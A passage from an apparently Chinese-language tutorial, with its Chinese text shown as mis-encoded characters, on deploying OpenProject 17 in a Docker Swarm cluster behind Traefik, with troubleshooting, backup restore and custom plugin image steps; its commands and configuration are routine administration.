      <span class="hljs-bullet">-</span> <span class="hljs-string">OPENPROJECT_FOG_CREDENTIALS_ENDPOINT="https://minio.example.com"</span>
    <span class="hljs-attr">secrets:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_secret_key_base</span>  <span class="hljs-comment"># æŒ‚è½½ç»Ÿä¸€åŠ å¯†å¯†é’¥</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">cache</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">6</span>  <span class="hljs-comment"># æ°´å¹³æ‰©å±•6ä¸ªwebå®ä¾‹ï¼Œå¯ç”¨å¯¹è±¡å­˜å‚¨åæ–¹å¯æ‰©å±•</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">update_config:</span>
        <span class="hljs-attr">parallelism:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># æ»šåŠ¨æ›´æ–°ï¼Œæ¯æ¬¡æ›´æ–°2ä¸ªå®ä¾‹ï¼Œé¿å…æœåŠ¡ä¸­æ–­</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">30s</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_internal</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_proxy</span>
    <span class="hljs-comment"># å¥åº·æ£€æŸ¥ï¼ˆç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼Œå…¼å®¹æ›´å¤šç‰ˆæœ¬ï¼Œæ›¿æ¢/healthè·¯å¾„ï¼‰</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"curl"</span>, <span class="hljs-string">"-f"</span>, <span class="hljs-string">"http://localhost/"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">start_period:</span> <span class="hljs-string">300s</span>
    <span class="hljs-attr">labels:</span>  <span class="hljs-comment"># è¡¥å……Traefikæ‰€éœ€æ ‡ç­¾ï¼Œæš´éœ²OpenProjectæœåŠ¡</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">traefik.enable=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">traefik.docker.network=openproject_proxy</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">traefik.http.routers.openproject.rule=Host(`openproject.example.com`)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">traefik.http.routers.openproject.entrypoints=websecure</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">traefik.http.services.openproject.loadbalancer.server.port=80</span>

  <span class="hljs-comment"># 4. OpenProject WorkeræœåŠ¡ï¼ˆä»»åŠ¡å¤„ç†ï¼Œæ°´å¹³æ‰©å±•ï¼Œæ·»åŠ èµ„æºé™åˆ¶é¿å…æŠ¢å Webèµ„æºï¼‰</span>
  <span class="hljs-attr">worker:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">./docker/prod/worker</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SECRET_KEY_BASE_FILE=/run/secrets/openproject_secret_key_base</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DATABASE_URL=postgresql://openproject:openproject_password@db:5432/openproject</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MEMCACHE_SERVER=cache:11211</span>
    <span class="hljs-attr">secrets:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_secret_key_base</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">cache</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">resources:</span>  <span class="hljs-comment"># æ–°å¢ï¼šé™åˆ¶Workerèµ„æºï¼Œé¿å…ä»»åŠ¡é«˜å³°æœŸæŠ¢å WebæœåŠ¡èµ„æº</span>
        <span class="hljs-attr">limits:</span>
          <span class="hljs-attr">cpus:</span> <span class="hljs-string">'1.0'</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_internal</span>

  <span class="hljs-comment"># 5. åå‘ä»£ç†æœåŠ¡ï¼ˆTraefikï¼Œä¸“ä¸šè´Ÿè½½å‡è¡¡ï¼Œè¡¥å……å®Œæ•´router/ruleé…ç½®ï¼‰</span>
  <span class="hljs-attr">traefik:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">traefik:v2.10</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"80:80"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"443:443"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock:ro</span>  <span class="hljs-comment"># åªè¯»æŒ‚è½½Dockerå¥—æ¥å­—ï¼Œè·å–æœåŠ¡ä¿¡æ¯</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/ssl/openproject:/ssl</span>  <span class="hljs-comment"># æŒ‚è½½SSLè¯ä¹¦ï¼ˆé™æ€è¯ä¹¦ï¼‰</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/traefik/acme.json:/acme.json</span>  <span class="hljs-comment"># ACMEè¯ä¹¦å­˜å‚¨ï¼ˆå¦‚éœ€è‡ªåŠ¨ç”³è¯·Let's Encryptï¼‰</span>
    <span class="hljs-attr">command:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--providers.docker=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--providers.docker.swarmmode=true</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--providers.docker.exposedbydefault=false</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--entrypoints.web.address=:80</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--entrypoints.websecure.address=:443</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--entrypoints.web.http.redirections.entryPoint.to=websecure</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--entrypoints.web.http.redirections.entryPoint.scheme=https</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">--entrypoints.websecure.http.tls=true</span>  <span class="hljs-comment"># å¯ç”¨é™æ€TLS</span>
      <span class="hljs-comment"># å¦‚éœ€è‡ªåŠ¨ç”³è¯·Let's Encryptè¯ä¹¦ï¼Œå¯æ·»åŠ ä»¥ä¸‹é…ç½®ï¼ˆæ³¨é‡Šæ‰é™æ€è¯ä¹¦æŒ‚è½½ï¼Œå¯ç”¨ACMEï¼‰</span>
      <span class="hljs-comment"># - --certificatesresolvers.le.acme.email=admin@example.com</span>
      <span class="hljs-comment"># - --certificatesresolvers.le.acme.storage=/acme.json</span>
      <span class="hljs-comment"># - --certificatesresolvers.le.acme.httpchallenge.entrypoint=web</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># åå‘ä»£ç†é«˜å¯ç”¨ï¼Œé¿å…å•ç‚¹æ•…éšœ</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span> [<span class="hljs-string">node.role</span> <span class="hljs-string">==</span> <span class="hljs-string">manager</span>]
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">openproject_proxy</span>

<span class="hljs-comment"># å®šä¹‰ç½‘ç»œï¼ˆéš”ç¦»å†…éƒ¨æœåŠ¡ä¸å¤–éƒ¨ä»£ç†ï¼‰</span>
<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">openproject_internal:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">overlay</span>
    <span class="hljs-attr">internal:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># å†…éƒ¨ç½‘ç»œï¼Œä¸å¯¹å¤–æš´éœ²</span>
  <span class="hljs-attr">openproject_proxy:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">overlay</span>
</code></pre>
<h4 data-id="heading-35">4. éƒ¨ç½²Swarm Stackå¹¶æ‰©å±•æœåŠ¡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># éƒ¨ç½²Stackï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®å…ˆåœ¨æµ‹è¯•é›†ç¾¤éªŒè¯ï¼‰</span>
docker stack deploy -c openproject-stack.yml openproject

<span class="hljs-comment"># æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼ˆç¡®ä¿æ‰€æœ‰æœåŠ¡replicasè¾¾åˆ°é¢„æœŸæ•°é‡ï¼‰</span>
docker service <span class="hljs-built_in">ls</span> | grep openproject

<span class="hljs-comment"># æŒ‰éœ€æ‰©å±•webæœåŠ¡ï¼ˆç¤ºä¾‹ï¼šæ‰©å±•åˆ°8ä¸ªå®ä¾‹ï¼Œä»…å¯ç”¨å¯¹è±¡å­˜å‚¨åå¯æ‰§è¡Œï¼‰</span>
docker service scale openproject_web=8
</code></pre>
<h4 data-id="heading-36">5. é›†ç¾¤éƒ¨ç½²å…³é”®æ³¨æ„äº‹é¡¹ï¼ˆå¿…é¡»éµå®ˆï¼‰</h4>
<ol>
<li>æ‰€æœ‰Web/Workerå®ä¾‹å¿…é¡»ä½¿ç”¨<strong>ç»Ÿä¸€çš„SECRET_KEY_BASE</strong>ï¼Œé€šè¿‡Docker Secretç®¡ç†ï¼Œé¿å…Sessionå¤±æ•ˆã€Cookieæ— æ³•è§£å¯†ï¼Œ<strong>ä¸¥ç¦åŠ¨æ€ç”Ÿæˆè¯¥å¯†é’¥</strong>ã€‚</li>
<li>å¤šå‰¯æœ¬WebæœåŠ¡å¿…é¡»é…åˆ<strong>S3/MinIOå¯¹è±¡å­˜å‚¨</strong>ï¼Œä¸¥ç¦ä½¿ç”¨æœ¬åœ°æ–‡ä»¶å­˜å‚¨/NFSï¼ˆé«˜å¹¶å‘åœºæ™¯ï¼‰ï¼Œå¦åˆ™ä¼šå‡ºç°æ–‡ä»¶è¦†ç›–ã€ä¸¢å¤±ã€ä¸‹è½½404ã€‚</li>
<li>åå‘ä»£ç†å¿…é¡»ä½¿ç”¨<strong>ä¸“ä¸šä»£ç†å·¥å…·ï¼ˆTraefik/Nginx/HAProxyï¼‰</strong>ï¼Œç¦æ­¢ä½¿ç”¨OpenProjectåº”ç”¨é•œåƒä½œä¸ºä»£ç†ã€‚</li>
<li><strong>æ•°æ®åº“æœåŠ¡è­¦å‘Š</strong>ï¼šSwarmç¤ºä¾‹ä¸­çš„PostgreSQLä»…ç”¨äºæ¼”ç¤ºï¼Œç”Ÿäº§ç¯å¢ƒå¿…é¡»ä½¿ç”¨ç‹¬ç«‹é«˜å¯ç”¨æ•°æ®åº“ï¼ˆRDS/Patroni/äº‘æ•°æ®åº“ï¼‰ï¼Œé¿å…å•ç‚¹æ•…éšœå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚</li>
<li>æ»šåŠ¨æ›´æ–°æ—¶ï¼Œå»ºè®®è®¾ç½®<code>parallelism</code>ä¸º2-3ï¼Œé¿å…ä¸€æ¬¡æ€§æ›´æ–°æ‰€æœ‰å®ä¾‹å¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚</li>
<li>WorkeræœåŠ¡å¿…é¡»é…ç½®èµ„æºé™åˆ¶ï¼Œé¿å…ä»»åŠ¡é«˜å³°æœŸæŠ¢å WebæœåŠ¡èµ„æºï¼Œå¯¼è‡´ç”¨æˆ·è®¿é—®å¡é¡¿ã€‚</li>
<li>Docker Swarmä¸­<code>depends_on</code>ä»…æ§åˆ¶å¯åŠ¨é¡ºåºï¼Œä¸ä¿è¯ä¾èµ–æœåŠ¡å¯ç”¨ï¼Œéœ€ä¾èµ–<strong>å¥åº·æ£€æŸ¥+åº”ç”¨è‡ªèº«é‡è¯•æœºåˆ¶</strong>ï¼ˆOpenProjectå·²å†…ç½®æ•°æ®åº“é‡è¯•é€»è¾‘ï¼‰ã€‚</li>
<li>Traefikéœ€é€šè¿‡<code>labels</code>é…ç½®routerå’Œserviceè§„åˆ™ï¼Œå¦åˆ™æ— æ³•æš´éœ²OpenProjectæœåŠ¡ï¼Œè®¿é—®ä¼šå‡ºç°404é”™è¯¯ã€‚</li>
</ol>
<h2 data-id="heading-37">åŠŸèƒ½æµ‹è¯•</h2>
<p>å®¹å™¨/é›†ç¾¤éƒ¨ç½²å®Œæˆåï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤éªŒè¯æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œï¼ˆä»…é’ˆå¯¹slimç‰ˆç”Ÿäº§ç¯å¢ƒï¼‰ï¼š</p>
<ol>
<li>
<p><strong>æŸ¥çœ‹å®¹å™¨/æœåŠ¡çŠ¶æ€</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å•å®¹å™¨éƒ¨ç½²</span>
docker ps | grep openproject  <span class="hljs-comment"># ç¡®ä¿çŠ¶æ€ä¸º Up</span>
<span class="hljs-comment"># è¡¥å……ï¼šdocker psé»˜è®¤ä¸æ˜¾ç¤ºå¥åº·çŠ¶æ€ï¼ŒæŸ¥çœ‹å¥åº·çŠ¶æ€éœ€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span>
docker inspect --format=<span class="hljs-string">'{{.State.Health.Status}}'</span> openproject-prod  <span class="hljs-comment"># ç¡®ä¿è¾“å‡ºä¸º healthy</span>

<span class="hljs-comment"># Swarmé›†ç¾¤éƒ¨ç½²</span>
docker service <span class="hljs-built_in">ls</span> | grep openproject  <span class="hljs-comment"># ç¡®ä¿æ‰€æœ‰æœåŠ¡ replicas ä¸º 1/1 æˆ–æŒ‡å®šæ•°é‡</span>
docker service ps openproject_web  <span class="hljs-comment"># æŸ¥çœ‹webæœåŠ¡å®ä¾‹è¿è¡ŒçŠ¶æ€ï¼Œç¡®ä¿æ— å¤±è´¥</span>
</code></pre>
</li>
<li>
<p><strong>è®¿é—®Webç•Œé¢</strong>ï¼š
åœ¨æµè§ˆå™¨ä¸­è¾“å…¥<code>https://&lt;ä½ çš„åŸŸå&gt;</code>ï¼ˆæˆ–<code>https://&lt;ä½ çš„åŸŸå&gt;/openproject</code>ï¼‰ï¼Œè‹¥èƒ½çœ‹åˆ°OpenProjectç™»å½•é¡µé¢ï¼Œè¯´æ˜åå‘ä»£ç†ä¸æœåŠ¡éƒ¨ç½²æˆåŠŸã€‚</p>
</li>
<li>
<p><strong>è·å–åˆå§‹ç®¡ç†å‘˜è´¦å·</strong>ï¼š
å®¹å™¨é¦–æ¬¡å¯åŠ¨æ—¶ä¼šç”Ÿæˆé»˜è®¤ç®¡ç†å‘˜è´¦å·ï¼Œå¯é€šè¿‡å®¹å™¨/æœåŠ¡æ—¥å¿—è·å–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å•å®¹å™¨éƒ¨ç½²</span>
docker logs openproject-prod | grep <span class="hljs-string">"Admin user"</span>

<span class="hljs-comment"># Swarmé›†ç¾¤éƒ¨ç½²ï¼ˆæŸ¥çœ‹webæœåŠ¡æ—¥å¿—ï¼‰</span>
docker service logs openproject_web | grep <span class="hljs-string">"Admin user"</span>
</code></pre>
<p>è¡¥å……ï¼šè‹¥æœªæ‰¾åˆ°ä¸Šè¿°æ—¥å¿—ï¼ˆæ–°ç‰ˆæœ¬å¯èƒ½ä¸æ‰“å°æˆ–ä»…è¾“å‡ºéšæœºå¯†ç ï¼‰ï¼Œå¯é€šè¿‡<code>openproject configure</code>å‘½ä»¤æˆ–OpenProject Webç•Œé¢é‡ç½®ç®¡ç†å‘˜å¯†ç ã€‚</p>
</li>
<li>
<p><strong>éªŒè¯æ ¸å¿ƒåŠŸèƒ½ï¼ˆç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼‰</strong>ï¼š
ä½¿ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•åï¼ŒéªŒè¯ä»¥ä¸‹æ ¸å¿ƒåŠŸèƒ½æ˜¯å¦æ­£å¸¸ï¼š</p>
<ul>
<li>åˆ›å»ºæ–°é¡¹ç›®ã€æ·»åŠ ä»»åŠ¡/å·¥ä½œåŒ…ã€‚</li>
<li>ä¸Šä¼ é™„ä»¶ã€ä¸‹è½½é™„ä»¶ï¼ˆé›†ç¾¤ç¯å¢ƒé‡ç‚¹éªŒè¯ï¼Œç¡®ä¿å¯¹è±¡å­˜å‚¨ç”Ÿæ•ˆï¼‰ã€‚</li>
<li>å‘é€æµ‹è¯•é‚®ä»¶ï¼ˆç³»ç»Ÿè®¾ç½®â†’é‚®ä»¶é…ç½®ï¼‰ã€‚</li>
<li>è®°å½•å·¥æ—¶ã€ç”Ÿæˆé¡¹ç›®æŠ¥è¡¨å¹¶å¯¼å‡ºã€‚</li>
<li>é›†ç¾¤ç¯å¢ƒï¼šåˆ‡æ¢ä¸åŒæµè§ˆå™¨/è®¾å¤‡ç™»å½•ï¼ŒéªŒè¯Sessionæ˜¯å¦ç¨³å®šï¼ˆæ— é¢‘ç¹ç™»å‡ºï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-38">æ•…éšœæ’æŸ¥</h2>
<h3 data-id="heading-39">å®¹å™¨æ— æ³•å¯åŠ¨</h3>
<ol>
<li>
<p><strong>æŸ¥çœ‹è¯¦ç»†å¯åŠ¨æ—¥å¿—</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker logs &lt;å®¹å™¨åç§°&gt;  <span class="hljs-comment"># æŸ¥çœ‹å®¹å™¨å¯åŠ¨é”™è¯¯ä¿¡æ¯ï¼Œå¸¸è§é”™è¯¯ï¼šç«¯å£å†²çªã€æƒé™ä¸è¶³ã€æ•°æ®åº“è¿æ¥å¤±è´¥</span>
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥ç«¯å£å ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ss -lntp | grep &lt;æ˜ å°„ç«¯å£&gt;  <span class="hljs-comment"># æ›¿æ¢netstatï¼Œé€‚é…Ubuntu 22.04+/Debian 12+ç­‰æ–°ç³»ç»Ÿï¼ŒæŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ</span>
<span class="hljs-comment"># è‹¥ç«¯å£å·²è¢«å ç”¨ï¼Œåœæ­¢å ç”¨è¿›ç¨‹æˆ–ä¿®æ”¹æ˜ å°„ç«¯å£</span>
</code></pre>
</li>
<li>
<p><strong>éªŒè¯æ•°æ®å·/ç›®å½•æƒé™</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ•°æ®å·æƒé™æ£€æŸ¥</span>
docker volume inspect &lt;æ•°æ®å·åç§°&gt;
<span class="hljs-comment"># æœ¬åœ°ç›®å½•æƒé™æ£€æŸ¥ï¼ˆç¡®ä¿é€‚é…å®¹å™¨érootç”¨æˆ· UID/GID 1000ï¼‰</span>
<span class="hljs-built_in">ls</span> -ld /var/openproject/prod  <span class="hljs-comment"># ç¡®ä¿ç›®å½•æ‰€æœ‰è€…ä¸º 1000:1000ï¼Œæƒé™ä¸º 775</span>
</code></pre>
</li>
<li>
<p><strong>è§£å†³ä¼ªTTYæƒé™é—®é¢˜</strong>ï¼š
è‹¥å‡ºç°<code>/dev/stdout: Permission denied</code>é”™è¯¯ï¼Œæ·»åŠ <code>-t</code>å‚æ•°é‡æ–°å¯åŠ¨å®¹å™¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -t -d --name openproject-prod ...
</code></pre>
<p>è¡¥å……ï¼š<code>-t</code>å‚æ•°çš„ä½œç”¨æ˜¯åˆ†é…ä¼ªç»ˆç«¯ï¼Œè§£å†³æŸäº›Ruby loggeråœ¨æ— TTYç¯å¢ƒä¸‹å†™å…¥<code>/dev/stdout</code>çš„æƒé™å¼‚å¸¸ï¼Œå¹¶éDocker stdoutæœ¬èº«çš„æƒé™é—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>Docker Secretç›¸å…³æ•…éšœ</strong>ï¼š
è‹¥å‡ºç°<code>SECRET_KEY_BASE</code>ç›¸å…³é”™è¯¯ï¼ŒéªŒè¯Secretæ˜¯å¦å­˜åœ¨å¹¶æ­£ç¡®æŒ‚è½½ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker secret <span class="hljs-built_in">ls</span> | grep openproject_secret_key_base
docker service inspect openproject_web | grep secret_key_base
</code></pre>
</li>
</ol>
<h3 data-id="heading-40">æœåŠ¡è®¿é—®å¼‚å¸¸</h3>
<ol>
<li>
<p><strong>æ£€æŸ¥å®¹å™¨å†…æœåŠ¡çŠ¶æ€</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">exec</span> -it &lt;å®¹å™¨åç§°&gt; curl -f http://localhost/  <span class="hljs-comment"># æ›¿æ¢/healthï¼Œå…¼å®¹æ›´å¤šç‰ˆæœ¬ï¼ŒéªŒè¯å®¹å™¨å†…æœåŠ¡æ˜¯å¦æ­£å¸¸</span>
</code></pre>
</li>
<li>
<p><strong>æ£€æŸ¥åå‘ä»£ç†é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nginx -t  <span class="hljs-comment"># éªŒè¯Nginxé…ç½®è¯­æ³•</span>
<span class="hljs-built_in">tail</span> -f /var/log/nginx/error.log  <span class="hljs-comment"># æŸ¥çœ‹Nginxé”™è¯¯æ—¥å¿—</span>
<span class="hljs-comment"># Swarmé›†ç¾¤ï¼ˆTraefikï¼‰</span>
docker service logs openproject_traefik
</code></pre>
</li>
<li>
<p><strong>éªŒè¯HOSTå¤´ä¸HTTPSé…ç½®</strong>ï¼š
è‹¥å‡ºç°<code>Invalid host</code>é”™è¯¯ï¼Œç¡®ä¿<code>OPENPROJECT_HOST__NAME</code>ä¸è®¿é—®åŸŸåä¸€è‡´ï¼ˆä¸å¡«å†™0.0.0.0/*/å†…ç½‘IPï¼‰ï¼›è‹¥å‡ºç°é‡å®šå‘å¾ªç¯ï¼Œç¡®ä¿<code>X-Forwarded-Proto</code>ï¼ˆNginxï¼‰/Traefik TLSè½¬å‘é…ç½®æ­£ç¡®ã€‚</p>
</li>
<li>
<p><strong>é›†ç¾¤Sessionå¤±æ•ˆé—®é¢˜</strong>ï¼š
è‹¥å‡ºç°ç”¨æˆ·é¢‘ç¹ç™»å‡ºï¼ŒéªŒè¯æ‰€æœ‰Web/Workerå®ä¾‹æ˜¯å¦ä½¿ç”¨ç»Ÿä¸€çš„<code>SECRET_KEY_BASE</code>ï¼Œç¡®ä¿Docker Secretæ­£ç¡®æŒ‚è½½ä¸”æœªé‡å¤ç”Ÿæˆï¼Œ<strong>ä¸¥ç¦åœ¨ç”Ÿäº§ç¯å¢ƒåŠ¨æ€ç”Ÿæˆè¯¥å¯†é’¥</strong>ã€‚</p>
</li>
</ol>
<h3 data-id="heading-41">æ•°æ®å·/å¤‡ä»½é—®é¢˜</h3>
<ol>
<li>
<p><strong>æ•°æ®å·æŸåä¿®å¤</strong>ï¼š</p>
<ul>
<li>åœæ­¢å®¹å™¨/æœåŠ¡ï¼š<code>docker stop &lt;å®¹å™¨åç§°&gt;</code> / <code>docker service scale openproject_web=0</code></li>
<li>åˆ›å»ºæ–°æ•°æ®å·ï¼š<code>docker volume create &lt;æ–°æ•°æ®å·åç§°&gt;</code></li>
<li>ä»å¤‡ä»½æ¢å¤æ•°æ®ï¼š<code>docker run --rm -v &lt;æ–°æ•°æ®å·åç§°&gt;:/target -v &lt;å¤‡ä»½ç›®å½•&gt;:/backup alpine tar -xzf /backup/&lt;å¤‡ä»½æ–‡ä»¶&gt;.tar.gz -C /target</code></li>
<li>ä½¿ç”¨æ–°æ•°æ®å·å¯åŠ¨å®¹å™¨/æœåŠ¡ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¤‡ä»½è„šæœ¬æ‰§è¡Œå¤±è´¥</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥è„šæœ¬æ‰§è¡Œæƒé™ï¼š<code>chmod +x &lt;å¤‡ä»½è„šæœ¬è·¯å¾„&gt;</code></li>
<li>æ£€æŸ¥crontabæ—¥å¿—ï¼š<code>tail -f /var/log/cron</code></li>
<li>æ‰‹åŠ¨æ‰§è¡Œè„šæœ¬ï¼ŒæŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼š<code>/var/backups/openproject/backup_openproject.sh</code></li>
<li>é›†ç¾¤ç¯å¢ƒï¼šç¡®ä¿å¤‡ä»½è„šæœ¬å¯è®¿é—®Swarmæ•°æ®å·/å¯¹è±¡å­˜å‚¨ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-42">é›†ç¾¤å¤šå‰¯æœ¬æ•°æ®é”™ä¹±é—®é¢˜</h3>
<ol>
<li>è‹¥å‡ºç°é™„ä»¶ä¸¢å¤±ã€å¯¼å‡ºæ–‡ä»¶404ï¼Œä¼˜å…ˆéªŒè¯å¯¹è±¡å­˜å‚¨é…ç½®æ˜¯å¦æ­£ç¡®ï¼š
<pre><code class="hljs language-bash" lang="bash">docker service logs openproject_web | grep fog  <span class="hljs-comment"># æŸ¥çœ‹å¯¹è±¡å­˜å‚¨ç›¸å…³æ—¥å¿—</span>
</code></pre>
</li>
<li>æœªå¯ç”¨å¯¹è±¡å­˜å‚¨çš„é›†ç¾¤ï¼Œç«‹å³å°†WebæœåŠ¡å‰¯æœ¬æ•°è°ƒæ•´ä¸º1ï¼š<code>docker service scale openproject_web=1</code></li>
<li>æ›´æ¢ä¸ºS3/MinIOå¯¹è±¡å­˜å‚¨ï¼Œé‡æ–°éƒ¨ç½²Stackã€‚</li>
</ol>
<h2 data-id="heading-43">é«˜çº§æ“ä½œ</h2>
<h3 data-id="heading-44">è‡ªå®šä¹‰æ’ä»¶å®‰è£…</h3>
<p>OpenProjectå®˜æ–¹é•œåƒä¸ç›´æ¥æ”¯æŒæ’ä»¶å®‰è£…ï¼Œéœ€é€šè¿‡æ„å»ºè‡ªå®šä¹‰é•œåƒå®ç°ï¼Œä»¥ä¸‹ä»¥å®‰è£…<code>openproject-slack</code>æ’ä»¶ä¸ºä¾‹ï¼Œ<strong>ä»…ä½¿ç”¨slimç‰ˆç¨³å®šé•œåƒ</strong>ï¼š</p>
<h4 data-id="heading-45">1. å‡†å¤‡æ„å»ºæ–‡ä»¶</h4>
<p>åˆ›å»º<code>custom-openproject</code>ç›®å½•ï¼Œåœ¨ç›®å½•å†…åˆ›å»ºä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<ul>
<li>
<p><code>Gemfile.plugins</code>ï¼ˆæ’ä»¶ä¾èµ–é…ç½®ï¼‰ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">group <span class="hljs-symbol">:opf_plugins</span> <span class="hljs-keyword">do</span>
  gem <span class="hljs-string">"openproject-slack"</span>, <span class="hljs-symbol">git:</span> <span class="hljs-string">"https://github.com/opf/openproject-slack.git"</span>, <span class="hljs-symbol">branch:</span> <span class="hljs-string">"dev"</span>
<span class="hljs-keyword">end</span>
</code></pre>
</li>
<li>
<p><code>Dockerfile</code>ï¼ˆæ„å»ºè‡ªå®šä¹‰é•œåƒï¼Œslimç‰ˆç¨³å®šç‰ˆç¤ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># é˜¶æ®µ1ï¼šå®‰è£…æ’ä»¶å¹¶é¢„ç¼–è¯‘èµ„æº
FROM vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim AS plugin

COPY Gemfile.plugins /app/

# å®‰è£…æ’ä»¶ä¾èµ–
RUN bundle config unset deployment &amp;&amp; bundle install &amp;&amp; bundle config set deployment 'true'
RUN ./docker/prod/setup/precompile-assets.sh

# é˜¶æ®µ2ï¼šæ„å»ºæœ€ç»ˆé•œåƒ
FROM vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim

# å¤åˆ¶æ’ä»¶ç›¸å…³æ–‡ä»¶
COPY --from=plugin /usr/bin/git /usr/bin/git
COPY --chown=$APP_USER:$APP_USER --from=plugin /app/vendor/bundle /app/vendor/bundle
COPY --chown=$APP_USER:$APP_USER --from=plugin /app/public/assets /app/public/assets
COPY --chown=$APP_USER:$APP_USER --from=plugin /app/config/frontend_assets.manifest.json /app/config/frontend_assets.manifest.json
COPY --chown=$APP_USER:$APP_USER --from=plugin /app/Gemfile.* /app/
</code></pre>
</li>
</ul>
<h4 data-id="heading-46">2. æ„å»ºè‡ªå®šä¹‰é•œåƒ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> custom-openproject
docker build --pull -t openproject-with-slack:17.0.0-slim .
</code></pre>
